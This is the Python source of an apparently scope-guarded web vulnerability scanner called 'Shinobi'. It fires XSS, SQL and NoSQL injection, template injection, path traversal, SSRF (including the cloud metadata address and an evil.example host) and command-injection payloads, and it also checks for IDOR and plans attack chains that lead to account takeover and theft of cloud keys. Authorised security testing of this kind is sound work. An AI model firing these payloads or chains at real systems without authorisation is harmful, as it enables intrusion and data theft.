"""Shinobi testing engine: payload injections, response-adaptive refinement,
role-diff authorization checks, and simple chain planning.

Pipeline
--------
1. For each role (incl. anonymous), open a scope-guarded session.
2. For every stored surface, fire a benign request -> ResponseProfile baseline.
3. Inject payloads per field/param. ResponseProfiles are compared to the
   baseline; divergent behaviour is triage-labelled (benign / interesting /
   finding) with machine-readable evidence.
4. Endpoints that look interesting get *refined*: the full payload set for that
   class plus encoded variants is re-run to confirm or deny (adaptive depth).
5. Role-diff: when several roles are provided, the same endpoint is triggered
   from each role; responses that don't diverge where they should signal weak
   authorization (IDOR / broken object level access candidates).
6. Chain-planner turns candidate groups into ordered attack chains.

Every request stays inside ProgramScope (GuardedSession hard-block).
"""
from __future__ import annotations

import dataclasses
import html as _html
import json
import re
import time
import typing
import urllib.parse

from shinobi import scope as scope_mod
from shinobi.net import GuardedSession
from shinobi.store import Store

# ------------------------------------------------------------------ payloads
# Curated from the cs_web.py plan; one prototype per class + a refined set per
# class that the engine deploys when the prototype shows a signal.
PAYLOAD_CLASSES: dict[str, list[str]] = {
    "reflected/stored XSS": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
        "\" autofocus onfocus=alert(1) x=\"",
    ],
    "SSTI": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}"],
    "SQLi": ["' OR '1'='1", "1' AND SLEEP(5)-- -", "1) OR 1=1-- -", "\" OR \"1\"=\"1"],
    "NoSQLi": ["' || '1'=='1", '{"$ne":null}', '{"$gt":""}', "';return true;var x='"],
    "path traversal / LFI": [
        "../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
    ],
    "SSRF / redirect": [
        "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "//evil.example",
    ],
    "OS command injection": [";id", "|id", "$(id)", "`id`", "%0aid"],
    "mass assignment": ['{"role":"admin"}', '{"isAdmin":true}', '{"user_id":1}'],
    "HTML injection": ["<h1>shinobi</h1>", "\"><svg/onload=alert(1)>"],
}

PROTOTYPES: dict[str, str] = {
    "reflected/stored XSS": "<script>alert(1)</script>",
    "SSTI": "{{7*7}}",
    "SQLi": "' OR '1'='1",
    "NoSQLi": '{"$ne":null}',
    "path traversal / LFI": "../../../../etc/passwd",
    "SSRF / redirect": "http://169.254.169.254/latest/meta-data/",
    "OS command injection": ";id",
    "mass assignment": '{"role":"admin"}',
    "HTML injection": "<h1>shinobi</h1>",
}

_ERROR_MARKS = {
    "SQLi": ["sql", "syntax error", "mysql", "postgres", "sqlite", "ORA-", "ODBC",
             "unclosed quotation", "division by zero"],
    "SSTI": ["jinja2", "template not", "undefined variable", "django", "twig",
             "template syntax"],
    "path traversal": ["root:x:0:0", "nobody:x:", "/etc/passwd", "no such file",
                       "permission denied"],
    "OS command injection": ["uid=", "command not found", "sh: ", "bin/sh"],
    "NoSQLi": ["bson", "mongo", "cast error", "objectid", "must be a 12-byte"],
}

TIMING_WINDOW_MS = 3000.0

CONTENT_REFLECTION = ("text/html", "text/plain", "application/javascript")


class Verdict(typing.NamedTuple):
    label: str            # benign | interesting | finding
    reason: str
    hints: list[str]


class ResponseProfile(typing.NamedTuple):
    status: int
    size: int
    timing_ms: float
    body: str
    content_type: str
    headers: dict[str, str]

    @property
    def focused(self) -> str:
        return f"{self.status} {self.size}b {self.timing_ms:.0f}ms {self.content_type}"


@dataclasses.dataclass
class TestOutcome:
    endpoint: str
    method: str
    param: str
    payload_class: str
    payload: str
    role: str
    profile: ResponseProfile
    verdict: Verdict


class Analyzer:
    """Compare an injection response against an endpoint baseline."""

    def analyze(self, baseline: ResponseProfile, resp: ResponseProfile,
                payload: str, param: str) -> Verdict:
        hints: list[str] = []
        ct = resp.content_type or ""
        body = resp.body or ""

        if _payload_reflected(resp, payload):
            hints.append("reflection")
            if any(e in ct for e in CONTENT_REFLECTION):
                return Verdict("interesting",
                               f"input reflected at {param} ({resp.focused})",
                               hints)

        err_hits = _classify_error(body)
        if err_hits:
            hints += err_hits
            return Verdict("interesting",
                           f"{'/'.join(err_hits)} tuple at {param} ({resp.focused})",
                           hints)

        if "SLEEP" in payload and resp.timing_ms > TIMING_WINDOW_MS \
                and resp.timing_ms > baseline.timing_ms * 3:
            hints.append("timing")
            return Verdict(
                "interesting",
                f"time-based delay {resp.timing_ms:.0f}ms vs {baseline.timing_ms:.0f}ms at {param}",
                hints)

        if resp.status != baseline.status and resp.status in (500, 502, 503, 504):
            hints.append("status-flip")
            return Verdict("interesting",
                           f"server error {resp.status} (base {baseline.status}) "
                           f"after {payload!r} at {param}",
                           hints)

        if ct and body and resp.status == baseline.status \
                and baseline.size > 0 and resp.size > baseline.size * 2.5:
            hints.append("size-spike")
            return Verdict("interesting",
                           f"response grew {baseline.size}b -> {resp.size}b at {param}",
                           hints)

        return Verdict("benign", f"no signal at {param} ({resp.focused})", [])


def _payload_reflected(resp: ResponseProfile, payload: str) -> bool:
    body = resp.body or ""
    if not body:
        return False
    for probe in (payload, urllib.parse.unquote(payload)):
        if probe and probe in body:
            return True
    return False


def _classify_error(text: str) -> list[str]:
    low = text.lower()
    return [cls for cls, marks in _ERROR_MARKS.items() if any(m in low for m in marks)]


def encode_variants(payload: str) -> list[str]:
    out = [payload]
    enc = urllib.parse.quote(payload, safe="")
    out.append(enc)
    out.append(enc.replace("%25", "%2525"))
    if payload.startswith("<"):
        out.append(_html.escape(payload))
    return out


class Engine:
    def __init__(self, scope_obj: scope_mod.ProgramScope, store: Store,
                 roles: list[str] | None = None,
                 session_factory: typing.Callable[[str], typing.Any] | None = None) -> None:
        self.scope = scope_obj
        self.store = store
        self.roles = roles or ["anonymous"]
        self.session_factory = session_factory
        self.analyzer = Analyzer()
        self.outcomes: list[TestOutcome] = []

    # --------------------------------------------------------------- sessions
    def _session_for(self, role: str) -> typing.Any:
        if self.session_factory is not None:
            return self.session_factory(role)
        # GuardedSession loads the stored cookie jar for (slug, role) itself.
        return GuardedSession(self.scope, self.store, role=role,
                              log_actor="shinobi-engine")

    # ------------------------------------------------------------------ fire
    def _fire(self, session: GuardedSession, method: str, url: str,
              params: dict | None = None, json_body: dict | None = None,
              role: str = "anonymous") -> ResponseProfile:
        headers = {"User-Agent": "Mozilla/5.0 (shinobi engine/0.4)"}
        t0 = time.monotonic()
        try:
            if json_body is not None:
                resp = session.request(method, url, params=params or {},
                                       json=json_body, headers=headers, timeout=15)
            else:
                resp = session.request(method, url, params=params or {},
                                       headers=headers, timeout=15)
        except Exception:  # noqa: BLE001
            return ResponseProfile(0, 0, 0.0, "", "", {})
        dt = (time.monotonic() - t0) * 1000.0
        body = ""
        if resp.content and _looks_text(resp.headers.get("content-type", "")):
            body = resp.text[:20000]
        return ResponseProfile(
            status=resp.status_code, size=len(resp.content or b""),
            timing_ms=dt, body=body,
            content_type=resp.headers.get("content-type", ""),
            headers=dict(resp.headers))

    # ------------------------------------------------------------------ run
    def run(self, surfaces: list[dict] | None = None,
            max_tests: int = 800) -> list[TestOutcome]:
        surfaces = surfaces if surfaces is not None else self.store.list_surfaces(self.scope.slug)
        sessions = {role: self._session_for(role) for role in self.roles}
        ran = 0
        try:
            for surf in surfaces:
                if ran >= max_tests:
                    break
                url, method = surf["url"], (surf["method"] or "GET").upper()
                params = surf.get("params") or {}
                for role in self.roles:
                    session = sessions[role]
                    baseline = self._fire(session, method, url, params=params, role=role)
                    if baseline.status == 0:
                        continue
                    probe_params = list(params) + ["q", "id", "action", "email", "amount"]
                    for param in probe_params:
                        if ran >= max_tests:
                            break
                        ran += 1
                        self._test_param(session, method, url, param, role, baseline)
        finally:
            for session in sessions.values():
                close = getattr(session, "close", None)
                if callable(close):
                    close()
        return self.outcomes

    def _test_param(self, session: GuardedSession, method: str, url: str,
                    param: str, role: str, baseline: ResponseProfile) -> None:
        body_method = method in ("POST", "PUT", "PATCH", "DELETE")
        for cls, payload in PROTOTYPES.items():
            if body_method:
                resp = self._fire(session, method, url,
                                  json_body={param: payload}, role=role)
            else:
                resp = self._fire(session, method, url,
                                  params={param: payload}, role=role)
            if resp.status == 0:
                continue
            verdict = self.analyzer.analyze(baseline, resp, payload, param)
            outcome = TestOutcome(endpoint=url, method=method, param=param,
                                  payload_class=cls, payload=payload, role=role,
                                  profile=resp, verdict=verdict)
            self.outcomes.append(outcome)
            if verdict.label != "benign":
                self._refine(session, out=outcome)
            self._record(outcome)

    # ------------------------------------------- response-adaptive refinement
    def _refine(self, session: GuardedSession, out: TestOutcome) -> None:
        for payload in PAYLOAD_CLASSES.get(out.payload_class, []):
            for variant in encode_variants(payload):
                if out.method in ("POST", "PUT", "PATCH", "DELETE"):
                    resp = self._fire(session, out.method, out.endpoint,
                                      json_body={out.param: variant}, role=out.role)
                else:
                    resp = self._fire(session, out.method, out.endpoint,
                                      params={out.param: variant}, role=out.role)
                if resp.status == 0:
                    continue
                verdict = self.analyzer.analyze(out.profile, resp, variant, out.param)
                if verdict.label != "benign":
                    self.outcomes.append(TestOutcome(
                        endpoint=out.endpoint, method=out.method, param=out.param,
                        payload_class=out.payload_class, payload=variant,
                        role=out.role, profile=resp, verdict=verdict))

    # -------------------------------------------------------------- recording
    def _record(self, outcome: TestOutcome) -> None:
        label = outcome.verdict.label
        detail = {"role": outcome.role, "method": outcome.method,
                  "param": outcome.param, "payload": outcome.payload,
                  "profile": outcome.profile.focused}
        self.store.log_activity(self.scope.slug, "shinobi-engine", "triage",
                                target=outcome.endpoint, detail=detail)
        if label in ("interesting", "finding"):
            self.store.add_finding(
                self.scope.slug, None,
                title=f"{outcome.payload_class} candidate @ "
                      f"{outcome.endpoint} ({outcome.param})",
                vuln_class=outcome.payload_class, severity="candidate",
                status="triage",
                evidence={**detail, "endpoint": outcome.endpoint,
                          "class": outcome.payload_class,
                          "reason": outcome.verdict.reason})


def _looks_text(content_type: str) -> bool:
    return any(k in content_type for k in
               ("text", "json", "javascript", "xml", "yaml", "html"))


# ------------------------------------------------------------ role diff / IDOR
def role_diff(scope_obj: scope_mod.ProgramScope, store: Store,
              roles: list[str], max_tests: int = 60) -> list[dict]:
    """Hit ID-like endpoints from each role and compare footprints.

    Relies on resource identifiers in the stored surfaces' params. If a
    low-privilege role gets the *same* footprint as a privileged role on an
    endpoint that should filter, that is a broken-object-access candidate to
    verify manually (never assume -- this is a triage seed, not a finding).
    """
    surfaces = store.list_surfaces(scope_obj.slug)
    engine = Engine(scope_obj, store, roles)
    results: list[dict] = []
    probes = 0
    for surf in surfaces[:50]:
        if probes >= max_tests:
            break
        url, method = surf["url"], (surf["method"] or "GET").upper()
        params = surf.get("params") or {}
        id_params = [k for k in params
                     if any(t in k.lower() for t in
                            ("id", "key", "token", "addr", "account", "user", "wallet"))]
        for p in (id_params or []):
            if probes >= max_tests:
                break
            probes += 1
            footprints: dict[str, list[str]] = {}
            for role in roles:
                session = engine._session_for(role)
                prof = engine._fire(session, method, url, params={p: "target-id-AAAA"},
                                    role=role)
                prof_b = engine._fire(session, method, url, params={p: "0x0000dead"},
                                      role=role)
                footprints[role] = [f"{prof.status}:{prof.size}",
                                    f"{prof_b.status}:{prof_b.size}"]
            distinct = {tuple(fp) for fp in footprints.values()}
            if len(distinct) == 1 and len(footprints) > 1:
                results.append({
                    "url": url, "method": method, "param": p,
                    "footprints": footprints,
                    "note": "same object footprint across roles "
                            "-> possible broken object-level access (verify manually)"})
    return results


# ------------------------------------------------------------------ chain plan
def plan_chains(candidates: list[TestOutcome]) -> list[dict]:
    by_param: dict[tuple, list[TestOutcome]] = {}
    for outcome in candidates:
        by_param.setdefault((outcome.endpoint, outcome.param), []).append(outcome)

    chains: list[dict] = []
    for (endpoint, param), outs in by_param.items():
        classes = {o.payload_class for o in outs}
        if "reflected/stored XSS" in classes:
            chains.append({
                "seed": f"reflected XSS @ {endpoint}?{param}",
                "steps": [
                    "confirm reflection + escaping in browser (is output HTML-encoded?)",
                    "if un-encoded: persist payload via the hosting feature -> stored XSS",
                    "if state-change endpoints lack CSRF tokens -> chain into CSRF action chain",
                    "target privileged victim session -> account control",
                ],
                "impact": "High (context dependent)",
            })
        if "SQLi" in classes or "NoSQLi" in classes:
            chains.append({
                "seed": f"DB injection @ {endpoint}?{param}",
                "steps": [
                    "confirm via delay (repeat 3x) or error tuple",
                    "extract a single distinguishing cell (error-based/UNION) as PoC",
                    "must prove reading beyond own data for the impact claim",
                ],
                "impact": "High/Critical (provable data exposure only)",
            })
        if "SSRF / redirect" in classes:
            chains.append({
                "seed": f"SSRF/open-redirect @ {endpoint}?{param}",
                "steps": [
                    "confirm with a listener: server must fetch (not the user's browser)",
                    "if 169.254.169.254/127.0.0.1 reach -> internal pivoting candidate",
                ],
                "impact": "Medium/High",
            })
        if "path traversal / LFI" in classes:
            chains.append({
                "seed": f"traversal @ {endpoint}?{param}",
                "steps": [
                    "read a known file first (fresh PoC file), then noise-free target",
                    "if source leaks (app.js, main.py) -> chain to secrets/cloud keys",
                ],
                "impact": "Medium/High (chain: source -> secrets)",
            })
    return chains